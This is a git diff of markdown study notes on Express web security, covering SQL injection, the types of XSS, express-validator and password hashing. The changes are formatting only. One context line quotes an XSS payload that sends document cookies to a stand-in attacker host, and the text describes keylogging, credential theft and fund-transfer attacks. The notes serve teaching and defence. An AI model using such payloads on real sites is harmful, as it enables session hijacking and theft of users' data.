@@ -265,7 +265,7 @@ app.get('/mutants/:role', function(req, res, next){
 SELECT * FROM accounts WHERE role = ('admin')
 ```
 
-# This query would return:
+* This query would return:
 
 ```
 profx
@@ -305,7 +305,7 @@ beast_bluevelvet
 
 #### Whitelisting  
 
-* Defining allowed inputs values (letters, digits, spaces) and conditions.
+* Defining *allowed* inputs values (letters, digits, spaces) and conditions.
 
 ##### Example
 
@@ -444,7 +444,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 #### Example
 
-* Sequelize example.
+* `Sequelize` example.
 
 ```
 var sequelize = require('sequelize');
@@ -498,51 +498,51 @@ app.get('/mutants/:role', function(req, res, next){
 
 ### Types of attack:  
 
-* Reflected XSS: it does not originate from the targeted server, but from the victim's request.
+* **Reflected XSS**: it does **not** originate from the targeted server, but from the victim's `request`.
 
   * This attacked can be delivered via another website or an email.
   
-  * The injected code is reflected off the server in a search result, error message, or another response which includes all or part of the input sent to the server as a request.
+  * The injected code is reflected off the server in a search result, error message, or another `response` which includes all or part of the `input` sent to the server as a `request`.
   
   1. A URL containing the malicious code is sent to the victim.
   
-  2. The victim then requests the URL from the website.
+  2. The victim then `requests` the URL from the website.
   
-  3. The website includes the malicious string from the URL in the response.
+  3. The website includes the malicious string from the URL in the `response`.
   
   4. The victim's browser executes the code sending the victims data back to the attacker's server.
 
-* Persistent (stored) XSS: the malicious code is stored in a target's server, where it is later retrieved by the victim via a request for data containing the malicious code.
+* **Persistent (stored) XSS**: the malicious code is stored in a target's server, where it is later retrieved by the victim via a `request` for data containing the malicious code.
 
   1. The attacker inject the malicious code into the server via a vulnerable form, which is stored in the database.
   
-  2.The victims makes a request to the website.
+  2.The victims makes a `request` to the website.
   
-  3.The response, containing the malicious code, is sent to the victim.
+  3.The `response`, containing the malicious code, is sent to the victim.
   
   4.The victim's browser executes the code sending the victims data back to the attacker's server.
 
-* DOM-based XSS: a combination of both persistent and reflected XSS:
+* **DOM-based XSS**: a combination of both `persistent` and `reflected` `XSS`:
 
   1. A URL containing the malicious code is sent to the victim.
   
-  2. The victim then requests the URL from the website.
+  2. The victim then `requests` the URL from the website.
   
-  3. The targeted website receives the request, but it does not include the malicious code in the response.
+  3. The targeted website receives the `request`, but it does not include the malicious code in the `response`.
   
-  4. The victim's browser executes the legitimate code inside the response, inserting the malicious code into the website.
+  4. The victim's browser executes the *legitimate* code inside the `response`, inserting the malicious code into the website.
   
-  5. The victim's browser executes the inserted malicious code and sends the response back to the attacker's server containing the victims data.
+  5. The victim's browser executes the *inserted* malicious code and sends the `response` back to the attacker's server containing the victims data.
   
   6. What makes it different?
   
   7. No malicious code is inserted into the website.
   
-  8. The website's own code uses the user's input in order to add HTML into the page using innerHTML.
+  8. The website's own code uses the user's input in order to add `HTML` into the page using `innerHTML`.
   
-  9. The code is parsed as HTML, which in turn executes the code after the page has loaded.
+  9. The code is `parsed` as `HTML`, which in turn executes the code after the page has loaded.
 
-* Key-logging: malicious code is using addEventListener is used to send a victim's keystrokes back to the attacker's server.
+* **Key-logging**: malicious code is using `addEventListener` is used to send a victim's keystrokes back to the attacker's server.
 
 ### Impact On User Privacy  
 
@@ -552,7 +552,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 ##### Example
 
-* In this example an XMLHttpRequest is used to transfer funds from the victim to the attacker.
+* In this example an `XMLHttpRequest` is used to transfer funds from the victim to the attacker.
 
 ```
 <script>
@@ -563,7 +563,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 #### Stealing credentials  
 
-* JavaScript and HTML are used to steal credentials instead of cookies. A targeted website's login page is cloned and it is served to a victim.
+* `JavaScript` and `HTML` are used to steal credentials instead of `cookies`. A targeted website's login page is cloned and it is served to a victim.
 
 ##### Example
 
@@ -585,7 +585,7 @@ app.get('/mutants/:role', function(req, res, next){
 
 #### Account Hijacking  
 
-* A victim's session cookies are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
+* A victim's `session` `cookies` are stolen, which in turn are used by the attacker to impersonate the victim and access sensitive information from their social media, bank accounts, etc.
 
 ##### Example
 
@@ -603,15 +603,15 @@ new Image().src = 'http://youvenoidea/steal.php?cookies=' +  encodeURI(document.
 
 #### express-validator  
 
-* The express-validator module simplifies input sanitation.
+* The `express-validator` module simplifies input sanitation.
 
 #### Usage
 
-* Install express-validator: npm install express-validator --save
+* Install `express-validator`: `npm install express-validator --save`
 
-* Import: var validator = require('express-validator')
+* Import: `var validator = require('express-validator')`
 
-* Apply after body-parser
+* Apply after `body-parser`
 
 ```
 //req.body.password = 'a <span>comment</span>';
@@ -638,45 +638,45 @@ app.post('/login', function(request, response){
 
 ### Terminology  
 
-* PBKDF2: a “password-strengthening algorithm” (HMAC) use to safeguard a password during a brute force attack by making it difficult, using iterations, to check whether or not that password is the master password.
+* `PBKDF2`: a “password-strengthening algorithm” (`HMAC`) use to safeguard a password during a brute force attack by making it difficult, using `iterations`, to check whether or not that password is the master password.
 
-  * Iterations: the number of times the encryption algorithm is applied.
+  * `Iterations`: the number of times the encryption algorithm is applied.
   
     * increases the strength of a password by increasing the time it takes to test each key in a brute force attack.
     
-    * key: the combination of the password, salt, and iterations count.
+    * `key`: the combination of the `password`, `salt`, and `iterations count`.
     
-* SHA-256: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.
+* `SHA-256`: Cryptographic Hash Algorithm that generates a unique 256-bit (32-byte) signature.
 
   * Encoding:
   
-    * hex: 64 characters.
+    * `hex`: 64 characters.
     
-    * base64: 44 characters.
+    * `base64`: 44 characters.
     
-* SHA-512: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.
+* `SHA-512`: Cryptographic Hash Algorithm that generates a unique 512-bit (64-byte) signature.
 
   * Encoding:
   
-    * hex: 128 characters.
+    * `hex`: 128 characters.
     
-    * base64: 88 characters.
+    * `base64`: 88 characters.
     
-* HMAC: hash based authentication code.
+* `HMAC`: hash based authentication code.
 
-* Hashing: the process of creating a fixed-length cryptic string from a variable-length string (password).
+* `Hashing`: the process of creating a fixed-length cryptic string from a variable-length string (password).
 
-* Salt: a unique and random string of characters used as an extra input in a hashing function in order to safeguard a stored password.
+* `Salt`: a unique and random string of characters used as an extra input in a `hashing` function in order to safeguard a stored password.
 
-  * salt is added to the password before hashing. This helps randomize the password and increases it's complexity in order to safeguard against rainbow and lookup table attacks.
+  * `salt` is added to the password before `hashing`. This helps randomize the password and increases it's complexity in order to safeguard against rainbow and lookup table attacks.
   
-  * A 12 bit salt would require 4096 rainbow tables in order to find a common password.
+  * A 12 bit `salt` would require 4096 rainbow tables in order to find a common password.
   
-* Digest: In a cryptographic hash function, the digest is the function's fixed-size alphanumeric output. (also known as message digest, checksum and digital fingerprint)
+* `Digest`: In a cryptographic hash function, the `digest` is the function's fixed-size alphanumeric output. (also known as `message digest`, `checksum` and `digital fingerprint`)
 
-* Crypto (module):
+* `Crypto` (module):
 
-> The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org
+> The crypto module provides cryptographic functionality that includes a set of wrappers for OpenSSL's hash, HMAC, cipher, decipher, sign and verify functions. -nodejs.org](https://nodejs.org/api/crypto.html#crypto_crypto)
 
 ### Why Salt and Hash?  
 
